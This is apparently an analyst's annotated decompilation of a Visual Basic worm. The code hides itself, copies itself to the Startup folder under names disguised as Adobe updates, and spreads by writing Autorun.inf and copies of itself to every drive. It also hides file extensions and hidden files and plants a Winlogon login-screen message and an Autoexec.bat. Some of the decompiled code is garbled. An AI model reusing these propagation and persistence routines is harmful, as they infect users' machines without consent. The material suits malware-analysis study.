VERSION 5.00
Begin VB.Form Form1
  BackColor = &H0&
  ForeColor = &H0&
  Enabled = 0   'False
  ScaleMode = 0
  AutoRedraw = False
  FontTransparent = False
  FillStyle = 0
  DrawMode = 1
  BorderStyle = 0 'None
  MaxButton = 0   'False
  MinButton = 0   'False
  ControlBox = 0   'False
  HasDC = 0   'False
  Visible = 0   'False
  ClipControls = 0   'False
  ClientLeft = 0
  ClientTop = 0
  ClientWidth = 90
  ClientHeight = 90
  ScaleLeft = 0
  ScaleTop = 0
  ScaleWidth = 90
  ScaleHeight = 90
  Begin Timer Timer1
    Interval = 500
    Left = 1800
    Top = 1320
  End
End

Attribute VB_Name = "Form1"

'VA: 40233C
Private Declare Function RegSetValueEx Lib "advapi32.dll" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, lpData As Any, ByVal cbData As Long) As Long         ' Note that if you the lpData parameter as String, you must pass it By Value.
'VA: 4022F4
Private Declare Function RegQueryValueEx Lib "advapi32.dll" Alias "RegQueryValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, lpType As Long, lpData As Any, lpcbData As Long) As Long         ' Note that if you the lpData parameter as String, you must pass it By Value. 
'VA: 4022A8
Private Declare Function RegDeleteValue Lib "advapi32.dll" Alias "RegDeleteValueA" (ByVal hKey As Long, ByVal lpValueName As String) As Long
'VA: 402260
Private Declare Function RegDeleteKey Lib "advapi32.dll" Alias "RegDeleteKeyA" (ByVal hKey As Long, ByVal lpSubKey As String) As Long
'VA: 402218
Private Declare Function RegCreateKeyEx Lib "advapi32.dll" Alias "RegCreateKeyExA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal Reserved As Long, ByVal lpClass As String, ByVal dwOptions As Long, ByVal samDesired As Long, lpSecurityAttributes As SECURITY_ATTRIBUTES, phkResult As Long, lpdwDisposition As Long) As Long
'VA: 4021D0
Private Declare Function RegCreateKey Lib "advapi32.dll" Alias "RegCreateKeyA" (ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long
'VA: 40219C
Private Declare Function RegCloseKey Lib "advapi32.dll" Alias "RegCloseKey" (ByVal hKey As Long) As Long
'VA: 402158
Private Declare Function RegOpenKeyEx Lib "advapi32.dll" Alias "RegOpenKeyExA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
'VA: 4020FC
Private Declare Function FindClose Lib "kernel32" Alias "FindClose" (ByVal hFindFile As Long) As Long
'VA: 4020B8
Private Declare Function FindNextFile Lib "kernel32" Alias "FindNextFileA" (ByVal hFindFile As Long, lpFindFileData As WIN32_FIND_DATA) As Long
'VA: 402070
Private Declare Function FindFirstFile Lib "kernel32" Alias "FindFirstFileA" (ByVal lpFileName As String, lpFindFileData As WIN32_FIND_DATA) As Long
'VA: 402018
Private Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long


Private Sub Timer1_Timer() '4034F4
  'Data Table: 401838
  loc_4034C7: var_94 = funct5()
  loc_4034D2: var_94 = funct6()
  loc_4034DD: var_94 = funct9()
  loc_4034E8: var_94 = funct10()
  loc_4034F0: Exit Sub
End Sub

'Run without making a window
Private Sub Form_Load() '403574
  'Data Table: 401838
  loc_403533: this_app = Me.Global.App
  loc_40353B: App.TaskVisible = False
  loc_40354F: this_app = Me.Global.App
  loc_403562: If App.PrevInstance Then
  loc_403565:   End
  loc_403567: End If
  loc_40356A: exit_code = funct0()
  loc_403572: Exit Sub
End Sub

Public Function funct0() '405960
  'Data Table: 401838
  Dim MemVar_407350 As Global
  Dim var_AC As Variant
  Dim var_BC As Variant

  loc_405782: On Error Resume Next

  loc_405793: var_98 = MemVar_407350.App
  loc_4057A3: var_AC = CVar(App.Path) 'String. Get the app path

  loc_4057A9: Thumbs   .db.address_80000210 ' Call to the DLL
  loc_4057B1: var_CC = var_BC 'Variant
  loc_4057C3: var_AC = 0
  loc_4057C8: var_BC = funct1(var_AC)
  loc_4057D9: If (var_CC = var_BC) Then
  loc_4057DE:   funct0 = var_BC
  loc_4057E4: End If
  loc_4057EB: var_FC = "\" 'Variant
  loc_4057FC: Thumbs   .db.address_8000026B
  loc_40580C: If CBool(var_AC <> var_FC) Then
  loc_40581B:   var_CC = var_CC & var_FC 'Variant
  loc_40581F: End If
  loc_40582D: var_98 = MemVar_407350.App
  loc_40583D: var_AC = CVar(App.EXEName) 'String
  loc_405843: Thumbs   .db.address_80000210
  loc_40584B: var_10C = var_BC 'Variant
  loc_40585F: var_AC = "Thumbs"
  loc_405868: Thumbs   .db.address_80000210
  loc_405879: If (var_BC = var_BC) Then
  loc_405890:   var_AC = InStr(1, var_CC, ":", 0)
  loc_40589C:   Thumbs   .db.address_80000269
  loc_4058A4:   var_11C = var_BC 'Variant
  loc_4058AE: Else
  loc_4058C1:   var_BC = (Len(var_10C) - 1)
  loc_4058CD:   Thumbs   .db.address_80000269
  loc_4058D9:   var_11C = var_EC & var_EC 'Variant
  loc_4058E0: End If
  loc_4058E7: var_AC = funct2()
  loc_405905: Call {0D608C23-AE41-11DB-A47CB713666A9177}.Method_arg_58 (var_130, var_10C, CLng(var_BC), var_CC, var_BC, var_CC, CLng(funct3(var_11C)), funct3(var_11C))
  loc_40593E: ShellExecute(var_130, "open", CStr(var_11C), vbNullString, vbNullString, 1)
  loc_405953: End
  loc_405957: funct0 = var_10C
End Function

' Gets the orignal DLL's current directory
Public Function funct1(a) '40389C
  'Data Table: 401838
  ' Variable declarations
  Dim var_E4 As Variant
  loc_403804: option = a 'Variant

  loc_403813: If (option = 0) Then
  loc_40381F:   Proc_1_7_40529C(windir, "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders") ' windir is not set
  'Calls the DLL 2 times
  loc_40382A:   Thumbs   .db.address_80000208
  loc_403835:   Thumbs   .db.address_80000210
  loc_40383D:   a = var_E4 ' var_E4 is not set

  loc_40384A: Else
  loc_403855:   If (option = 1) Then
  loc_40385D:     windir = "windir"
                  'Calls the DLL, maybe with parameter windir
  loc_403866:     Thumbs   .db.address_8000029A
  loc_403880:     a = dll_dir & "\" & "Thumbs   .db" ' dll_dir is not set
  loc_40388C:   End If
  loc_40388C: End If

  loc_403892: unsused_var = a 'Variant
  loc_403896: funct1 = dll_dir ' Return dll_dir
End Function

Public Function funct2() '405BF8
  'Data Table: 401838
  Dim MemVar_407350 As Global
  Dim var_BC As Variant
  Dim var_160 As String
  Dim var_9C As String
  Dim var_168 As Double
  loc_4059D2: On Error Resume Next
  loc_4059E3: var_98 = MemVar_407350.App
  loc_4059F6: var_AC = CVar(App.EXEName) 'Variant
  loc_405A0B: var_98 = Me.Global.App
  loc_405A1B: var_BC = CVar(App.Path) 'String
  loc_405A32: Thumbs   .db.address_8000026B
  loc_405A45: If CBool(var_BC <> "\") Then
  loc_405A56:   var_CC = var_BC & "\" 'Variant
  loc_405A5A: End If
  loc_405A6F: var_FC = var_CC & var_AC & ".com" 'Variant
  loc_405A8B: var_10C = var_CC & var_AC & ".scr" 'Variant
  loc_405AAD: var_13C = funct1(0) & "\" 'Variant
  loc_405ACF: var_14C = var_13C & "Adobe update" & ".com" 'Variant
  loc_405AED: var_15C = var_13C & "Adobe Online" & ".com" 'Variant
  loc_405AF9: var_160 = CStr(var_14C)
  loc_405B00: var_9C = CStr(var_FC)
  loc_405B04: Thumbs   .db.address_80000240
  loc_405B15: var_160 = CStr(var_15C)
  loc_405B1C: var_9C = CStr(var_FC)
  loc_405B20: Thumbs   .db.address_80000240
  loc_405B31: var_160 = CStr(var_14C)
  loc_405B38: var_9C = CStr(var_10C)
  loc_405B3C: Thumbs   .db.address_80000240
  loc_405B4D: var_160 = CStr(var_15C)
  loc_405B54: var_9C = CStr(var_10C)
  loc_405B58: Thumbs   .db.address_80000240
  loc_405B76: var_160 = CStr(funct1(1))
  loc_405B86: var_9C = CStr(var_CC & "Thumbs   .db")
  loc_405B8A: Thumbs   .db.address_80000240
  loc_405BB6: var_9C = CStr(funct1(1))
  loc_405BBA: Thumbs   .db.address_80000244
  loc_405BD3: Thumbs   .db.address_80000258
  loc_405BD8: var_168 = var_14C
  loc_405BE5: Thumbs   .db.address_80000258
  loc_405BEF: funct2 = var_15C
End Function

' Get descriptor for the second file in given path
Public Function funct3(path) '404DDC
  'Data Table: 401838
  Dim null_ptr As Variant
  Dim search_path As String
  Dim filesearch_status As Long

  loc_404C86: On Error Resume Next ' Ignore errors

  loc_404C90: backslash = "\" 'Variant
  loc_404C96: ' Referenced from: 404DD1
  loc_404C98: Thumbs   .db.address_80000256
  loc_404CAA: Thumbs   .db.address_8000026B

  ' This portion of code needs further investigation.
  ' (If "\" not at the end, add it?)
  loc_404CBA: If CBool(null_ptr <> backslash) Then ' If null_ptr NOT backslash
  loc_404CCC:   path = path & backslash ' Add a backslash to the path
  loc_404CCF: End If

  loc_404CEC: search_path = CStr(path & "*") ' Set path var with path wildcard, presumably to select multiple items
  
            'HANDLE FindFirstFileA(                     // Note: Using C++ function prototype
            '  [in]  LPCSTR             lpFileName,     // Path to the folder to searh on. If wildcard, perform a full search on path.
            '  [out] LPWIN32_FIND_DATAA lpFindFileData  // Pointer to the struct/array with the wanted characteristics
            ');
            '
            'typedef struct _WIN32_FIND_DATAA {         // Struct of characteristics. For sanity reasons I will call this a "descriptor"
            '  DWORD    dwFileAttributes;
            '  FILETIME ftCreationTime;
            '  FILETIME ftLastAccessTime;
            '  FILETIME ftLastWriteTime;
            '  DWORD    nFileSizeHigh;
            '  DWORD    nFileSizeLow;
            '  DWORD    dwReserved0;
            '  DWORD    dwReserved1;
            '  CHAR     cFileName[MAX_PATH];
            '  CHAR     cAlternateFileName[14];
            '  DWORD    dwFileType;
            '  DWORD    dwCreatorType;
            '  WORD     wFinderFlags;
            '} WIN32_FIND_DATAA, *PWIN32_FIND_DATAA, *LPWIN32_FIND_DATAA;

  ' first_file_found_data MUST be an array with the desired file characteristics
  ' Find first file in search_path and store its descriptor in first_file_found_data
  loc_404D10: file_handle = CVar(FindFirstFile(search_path, Record Of first_file_found_data)) 'Variant.
  loc_404D3D: null_ptr = funct4(wildard_path2, path, first_file_found_data) ' wildard_path2 hasnt been initialized yet

  loc_404D48: wildard_path2 = search_path
  loc_404D51: ' Referenced from: 404DB7 <- Top of loop
  loc_404D59: result_descriptor = Record Of first_file_found_data 'Copy array to result_descriptor

  ' Dont continue unless other file is found
  ' FindNextFile() will return a non-zero value. If the function fails, then 0 is returned.
  ' If function succeeds, it will store the next file's descriptor in lpFindFileData
              'BOOL FindNextFileA(
              '  [in]  HANDLE             hFindFile,
              '  [out] LPWIN32_FIND_DATAA lpFindFileData
              ');
  loc_404D69: filesearch_status = FindNextFile(CLng(file_handle), result_descriptor) ' Get the second file found
  loc_404D7F: If (filesearch_status <> 0) Then ' If search fails, call funct4 and try again
  loc_404DA1:   null_ptr = funct4(wildard_path2, path, first_file_found_data) ' Maybe drop some files?
  loc_404DAC:   wildard_path2 = search_path
  loc_404DB7:   GoTo loc_404D51 ' <- Bottom of loop
  loc_404DBA: End If

  loc_404DC1: FindClose(CLng(file_handle)) ' Close the handle
  loc_404DC9: funct3 = result_descriptor ' Return the new file's descriptor

  ' This presumably wont execute, beacause if it did then other
  ' calls to this function wouldnt make any sense.
  ' Example: loc_405905 in function funct0()
  loc_404DD1: GoTo loc_404C96
  loc_404DD6: funct3 = filesearch_status
End Function

Public Function funct4(a, b, c) '404C24
  'Data Table: 401838
  Dim var_C4 As Variant
  Dim var_D8 As String
  Dim var_DC As String
  Dim var_120 As Variant
  loc_404A82: On Error Goto loc_404C16
  loc_404A90: var_C4 = c And 16
  loc_404AC4: If CBool(CStr(a) And (Thumbs   .db.address_80000268 <> ".")) Then
  loc_404ADA:   var_100 = Me.Global.App
  loc_404AE2:   App.HelpFile = CStr(a)
  loc_404AFF:   var_100 = Me.Global.App
  loc_404B16:   var_110 = b & CVar(App.HelpFile) 'Variant
  loc_404B3B:   Thumbs   .db.address_80000210
  loc_404B59:   If CBool(InStr(var_110, var_120, var_120, 0)) Then
  loc_404B5C:     funct4 = funct1(0)
  loc_404B62:   End If
  loc_404B77:   var_140 = var_110 & " " & ".scr" 'Variant
  loc_404B96:   If (Thumbs   .db.address_80000285 <> vbNullString) Then
  loc_404B99:     funct4 = var_140
  loc_404B9F:   End If
  loc_404BA7:   var_D8 = CStr(var_110)
  loc_404BAB:   Thumbs   .db.address_80000244
  loc_404BC3:   var_DC = CStr(var_140)
  loc_404BE5:   var_D8 = CStr(funct1(0) & "\" & "Adobe update" & ".com")
  loc_404BE9:   Thumbs   .db.address_80000240
  loc_404C0A:   var_D8 = CStr(var_140)
  loc_404C0E:   Thumbs   .db.address_80000244
  loc_404C16:   ' Referenced from: 404A82
  loc_404C16: End If
  loc_404C16: funct4 = var_D8
  loc_404C1C: funct4 = 1
End Function

' Makes the main registry modifications and installs the creepy screen
Public Function funct5() '405F80
  'Data Table: 401838
  Dim regpath_winlogon As Variant
  Dim creepy_msg_pt1 As String
  Dim creepy_msg_pt2 As String

' Note: Still remains figuring out what each registry key does. Pending.

' Note: In Visual Basic, the symbol "&" is NOT a logical "AND",
' and is used EXCLUSIVELY for string concatenation

' Variable naming convention definition:
' Every STATIC STRING-type variable containing a REGISTRY key OR path SHOULD be prefixed by the string "regpath_"
' Every NON-STATIC STRING-type variable containing a REGISTRY key OR path SHOULD be prefixed by the string "regpath_", and should contain a descriptive name

' vbCrLf -> "\n": vbCrLf stands for Visual Basic Carriage Return Line Feed. In short, "next line".

  loc_405C67: HKCR = "HKEY_CLASSES_ROOT\scrfile" 'Variant
  loc_405C78: Proc_1_10_404014(regpath_winlogon, CStr(HKCR))

  ' Installs the vital regkeys
  loc_405C93: AddRegKey(regpath_winlogon, CStr(HKCR), vbNullString)
  loc_405CAE: AddRegKey(regpath_winlogon, CStr(HKCR), "InfoTip")
  loc_405CC9: AddRegKey(regpath_winlogon, CStr(HKCR), "NeverShowExt", vbNullString)
  loc_405CE4: AddRegKey(regpath_winlogon, CStr(HKCR), "TileInfo", vbNullString)
  loc_405D08: AddRegKey(var_D8, CStr(HKCR & "\shell\open\command"), vbNullString, "%1")

  loc_405D1C: regpath_microsoft = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\" 'Variant
  loc_405D28: regpath_winlogon = regpath_microsoft & "Windo?s NT\CurrentVersion\Winlogon???" ' Corrupted registry key?
  loc_405D2C: regpath_winlogon2 = regpath_winlogon 'Variant

  ' Adds the creepy message to the login screen
  loc_405D40: AddRegKey(regpath_winlogon, CStr(regpath_winlogon2), "?egalNoticeCaption", "81u3f4nt45y - 24.01.2007 - Surabaya")
  loc_405D67: creepy_msg_pt1 = "Surabaya in my birthday" & vbCrLf & "Don't kill me, i'm just send message from your computer" & vbCrLf & "Terima kasih telah menemaniku walaupun hanya sesaat, tapi bagiku sangat berarti"
  loc_405D83: creepy_msg_pt2 = creepy_msg_pt1 & vbCrLf & "Maafkan jika kebahagiaan yang kuminta adalah teman sepanjang hidupku" & vbCrLf & "Seharusnya aku mengerti bahwa keberadaanku bukanlah disisimu, hanyalah lamunan dalam sesal"
  loc_405DA1: AddRegKey(regpath_winlogon, CStr(regpath_winlogon2), "LegalNoticeText", creepy_msg_pt2 & vbCrLf & "Untuk kekasih yang tak kan pernah kumiliki 3r1k1m0")

  ' Finish installing the registry keys
  loc_405DC7: var_130 = "CheckedValue" 'Variant
  loc_405DD0: var_140 = "DefaultValue" 'Variant
  loc_405DE0: regpath_folder = regpath_microsoft & "Windows\CurrentVersion\explorer\Advanced\Folder\" 'Variant
  loc_405DF0: regpath_hidden = regpath_folder & "Hidden\" 'Variant
  loc_405DFC: regpath_winlogon = regpath_hidden & "NOHIDDEN" 
  loc_405E00: var_170 = regpath_winlogon 'Variant
  loc_405E1A: Proc_1_2_4044D4(regpath_winlogon, CStr(var_170), CStr(var_130), 2)
  loc_405E3F: Proc_1_2_4044D4(regpath_winlogon, CStr(var_170), CStr(var_140), 2)
  loc_405E56: regpath_winlogon = regpath_hidden & "NOHIDORSYS" 
  loc_405E5A: var_170 = regpath_winlogon 'Variant
  loc_405E74: Proc_1_2_4044D4(regpath_winlogon, CStr(var_170), CStr(var_130), 0)
  loc_405E99: Proc_1_2_4044D4(regpath_winlogon, CStr(var_170), CStr(var_140), 2)
  loc_405EB0: regpath_winlogon = regpath_hidden & "SHOWALL" 
  loc_405EB4: var_170 = regpath_winlogon 'Variant
  loc_405ECE: Proc_1_2_4044D4(regpath_winlogon, CStr(var_170), CStr(var_130), 0)
  loc_405EF3: Proc_1_2_4044D4(regpath_winlogon, CStr(var_170), CStr(var_140), 2)
  loc_405F0A: regpath_winlogon = regpath_folder & "HideFileExt" 
  loc_405F0E: var_170 = regpath_winlogon 'Variant
  loc_405F28: Proc_1_2_4044D4(regpath_winlogon, CStr(var_170), CStr(var_130), 1)
  loc_405F4D: Proc_1_2_4044D4(regpath_winlogon, CStr(var_170), CStr(var_140), 1)
  loc_405F6E: Proc_1_2_4044D4(regpath_winlogon, CStr(var_170), "UncheckedValue", 1)
  loc_405F79: funct5 = vbNullString ' Dont return
End Function

Public Function funct6() '403B6C
  'Data Table: 401838
  Dim var_114 As Variant
  loc_403ACB: For var_F4 = 67 To 90: var_A4 = var_F4 'Variant
  loc_403AD1:   Thumbs   .db.address_80000256
  loc_403AE1:   Thumbs   .db.address_80000260
  loc_403B00:   If (var_114 > 0) Then
  loc_403B0B:     Thumbs   .db.address_80000260
  loc_403B25:     var_134 = funct7(var_104) & ":" & "\" 'Variant
  loc_403B36:     var_104 = funct3(var_134)
  loc_403B44:     var_104 = funct8(var_134)
  loc_403B52:     var_104 = funct11(var_134)
  loc_403B5A:   End If
  loc_403B5D: Next var_F4 'Variant
  loc_403B63: funct6 = 
End Function

Public Function funct7(a) '403EC8 ' Disk drive stuff?
  'Data Table: 401838
  'Link to opcode list: https://www.dotfix.net/doc/vb_pcode_table.htm

  loc_403DEA: On Error Goto loc_403EBA ' Exit on error
  loc_403DED: ILdDarg ' Uncommon opcode
              'Call the DLL
  loc_403DFC: Thumbs   .db.address_800002CC
  loc_403E04: VarLateMemCallLdRfVar ' Another rarely used opcode

  ' Returns the storage drive type of the Drive object named drive. Ref: https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/drivetype-property
  loc_403E12: drive_type = drive.drivetype 'Variant. drive MUST be a Drive object, but has not been declared

  ' Stupid way of saying a = drive_type, where "a" must range from 0 to 5
  loc_403E28: If (drive_type = 0) Then
  loc_403E30:   a = 0
  loc_403E36: Else
  loc_403E41:   If (drive_type = 1) Then
  loc_403E49:     a = 1
  loc_403E4F:   Else
  loc_403E5A:     If (drive_type = 2) Then
  loc_403E62:       a = 2
  loc_403E68:     Else
  loc_403E73:       If (drive_type = 3) Then
  loc_403E7B:         a = 3
  loc_403E81:       Else
  loc_403E8C:         If (drive_type = 4) Then
  loc_403E94:           a = 4
  loc_403E9A:         Else
  loc_403EA5:           If (drive_type = 5) Then
  loc_403EAD:             a = 5
  loc_403EB0:           End If
  loc_403EB0:         End If
  loc_403EB0:       End If
  loc_403EB0:     End If
  loc_403EB0:   End If
  loc_403EB0: End If
  
  loc_403EB6: drive_type2 = a 'Variant. drive_type2 = a = drive_type = drive.drivetype
  loc_403EBA: ' Referenced from: 403DEA
  loc_403EBA: funct7 = drive ' This will be overwritten in the next instruction
  loc_403EC0: funct7 = "scripting.filesystemobject" ' Return "scripting.filesystemobject"
End Function

' Drop 2 copies on selected path
Public Function funct8(a) '4054C0
  'Data Table: 401838
  ' Note: <> means a logical NOT operator

  ' Define vars
  Dim sus_data As String
  Dim exe_path2 As String
  Dim autorun_content As Variant

  loc_4052F6: On Error Resume Next ' Ignore errors and keep running

  loc_405305: exe_name = CVar("Thumbs" & ".com") 'Variant
  loc_40531A: autorun_path = a & "Autorun.inf" 'Variant.
  loc_40532D: exe_path = a & exe_name 'Variant

  loc_40534E: sus_data = Thumbs   .db.address_80000285 ' Gives this var the value of that address, but will be overwritten
  
  ' Sets funct8 to 3 if the exe_path is set/valid (?) and the DLL is present
  loc_405373: If (exe_path And (Thumbs   .db.address_80000285 <> vbNullString)) Then ' If the path of the EXE file and the value on the DLL file IS NOT NULL, then...
  loc_405378:   funct8 = CLng(3) ' Set the return code to 3, but dont exit
  loc_40537E: End If
  
  loc_405388: sus_data = CStr(autorun_path)

  ' Calls 2 DLL functions
  loc_40538C: Thumbs   .db.address_80000244
  loc_405399: Thumbs   .db.address_80000211

  ' Drops the autorun
  loc_4053AC: Open CStr(autorun_path) For Output As 1 Len = &HFF ' Set a buffer for the file (???)
                                                                 ' Small note break:
                                                                 ' & is prepended for Long types
                                                                 ' H is prepended for hex representations
                                                                 ' So &HFF indicates a Long hex number with value FFh = 255dec
  loc_405404: autorun_content = CVar("[Autorun]" & vbCrLf & "Open=") & exe_name & vbCrLf & "Shellexecute=" & exe_name & vbCrLf & "Shell\auto\command=" & exe_name & vbCrLf 
  loc_405413: Print 1, autorun_content & "Shell=auto"
  loc_405437: Close 1

  ' Copies itself with the name Adobe update.com using funct1()
  loc_40544B: exe_path2 = CStr(exe_path)
  loc_40546D: sus_data = CStr(funct1(0) & "\" & "Adobe update" & ".com")

  ' Calls 2 different addresses 3 times in total. (maybe sus_data -> call args?)
  loc_405471: Thumbs   .db.address_80000240
  loc_405494: sus_data = CStr(autorun_path)
  loc_405498: Thumbs   .db.address_80000244
  loc_4054AE: Thumbs   .db.address_80000244
  loc_4054B8: funct8 = CStr(exe_path) ' Return CStr(exe_path)
End Function

' Drops Autoexec.bat
Public Function funct9() '404A00 ' WARNING: The renamings made here are pure speculation
  'Data Table: 401838
  ' Variable declaration
  Dim var_B4 As Variant
  Dim autoexec_path2 As String
  Dim autoexec_s1 As String
  Dim autoexec_s2 As String
  Dim autoexec_s3 As String

  loc_4048B2: On Error Resume Next ' Ignore errors and continue

  loc_4048BF: dll_path = funct1(0) ' Get DLL current path
  loc_4048E2: var_B4 = InStr(1, dll_path, ":", 0)
  loc_4048EE: Thumbs   .db.address_80000269 ' Call the DLL
  loc_4048FF: autoexec_path = dll_path & "Autoexec.bat" 'Variant

  ' If CALL_RESULT NOT NULL -> return autoexec_path
  loc_404924: If (Thumbs   .db.address_80000285 <> vbNullString) Then
  loc_404929:   funct9 = autoexec_path
  loc_40492F: End If

  loc_404939: autoexec_path2 = CStr(autoexec_path)
              'Call 2 DLL functions
  loc_40493D: Thumbs   .db.address_80000244
  loc_40494A: Thumbs   .db.address_80000211

  ' Drop Autoexec.bat in the same folder as the DLL
  loc_40495D: Open CStr(autoexec_path) For Output As 1 Len = &HFF
  loc_404982: autoexec_s1 = "@Echo Off" & vbCrLf & "Echo 81u3f4nt45y - 24.01.2007" & vbCrLf & "Echo Don't kill me, i'm just send message from your computer"
  loc_40499E: autoexec_s2 = autoexec_s1 & vbCrLf & "Echo Terima kasih telah menemaniku walaupun hanya sesaat, tapi bagiku sangat berarti" & vbCrLf & "Echo Maafkan jika kebahagiaan yang kuminta adalah teman sepanjang hidupku"
  loc_4049BA: autoexec_s3 = autoexec_s2 & vbCrLf & "Echo Seharusnya aku mengerti bahwa keberadaanku bukanlah disisimu, hanyalah lamunan dalam sesal" & vbCrLf & "Echo Untuk kekasih yang tak kan pernah kumiliki 3r1k1m0"
  loc_4049CD: Print 1, autoexec_s3 & vbCrLf & "pause"
  loc_4049F6: Close 1
  loc_4049FA: funct9 = autoexec_path ' Return autoexec_path
End Function

' Drops the 2 copies of itself
Public Function funct10() '40417C
  'Data Table: 401838
  ' Define variables
  Dim original_name As Variant
  Dim copy1_name As Variant
  Dim var_140 As String
  Dim var_11C As String
  Dim remaining_copy As Double

  loc_404066: On Error Goto loc_40416F ' Exit on error

  loc_404082: startup_path = funct1(0) & "\" ' Get the Startup folder path
  loc_4040A2: ao_path = startup_path & "Adobe Online" & ".com" 'Variant. Name of the first copy
  loc_4040BE: au_path = startup_path & "Adobe update" & ".com" 'Variant. Name of the second copy
  loc_4040D1: var_118 = Me.Global.App

  loc_4040E1: original_name = CVar(App.EXEName) 'String
  loc_4040E7: Thumbs   .db.address_80000210
  loc_4040F4: copy1_name = "Adobe Online"
  loc_4040FD: Thumbs   .db.address_80000210
  
  ' Copy itself to the given path ?
  loc_404115: If (var_12C = var_12C) Then
  loc_40411B:   var_140 = CStr(au_path) ' Maybe an arg?
  loc_404122:   var_11C = CStr(ao_path) ' Maybe an arg?
                ' The files must be created and copied to the location,
                ' so its probable that this 2 calls are responsible
                ' for the file system operations
  loc_404126:   Thumbs   .db.address_80000240
  loc_40413A:   Thumbs   .db.address_80000258
  loc_40413F:   remaining_copy = au_path
  loc_404145: Else ' Do the same as above, but return different app paths
  loc_404148:   var_140 = CStr(ao_path)
  loc_40414F:   var_11C = CStr(au_path)
  loc_404153:   Thumbs   .db.address_80000240
  loc_404167:   Thumbs   .db.address_80000258
  loc_40416C:   remaining_copy = ao_path
  loc_40416F: End If

  loc_40416F: ' Referenced from: 404066
  loc_40416F: funct10 = remaining_copy
  loc_404175: funct10 = 2 ' Return 2
End Function

Public Function funct11(a) '403C7C
  'Data Table: 401838
  Dim var_E8 As String
  Dim var_FC As String
  loc_403BC2: On Error Resume Next
  loc_403BD6: var_D4 = a & "Thumbs   .db" 'Variant
  loc_403BE4: var_E4 = 3 'Variant
  loc_403C02: If (Thumbs   .db.address_80000285 <> vbNullString) Then
  loc_403C07:   funct11 = var_D4
  loc_403C0D: End If
  loc_403C17: var_E8 = CStr(var_D4)
  loc_403C1B: Thumbs   .db.address_80000244
  loc_403C28: Thumbs   .db.address_80000211
  loc_403C3F: var_FC = CStr(var_D4)
  loc_403C46: var_E8 = CStr(funct1(1))
  loc_403C4A: Thumbs   .db.address_80000240
  loc_403C6B: Thumbs   .db.address_80000244
  loc_403C75: funct11 = CStr(var_D4)
End Function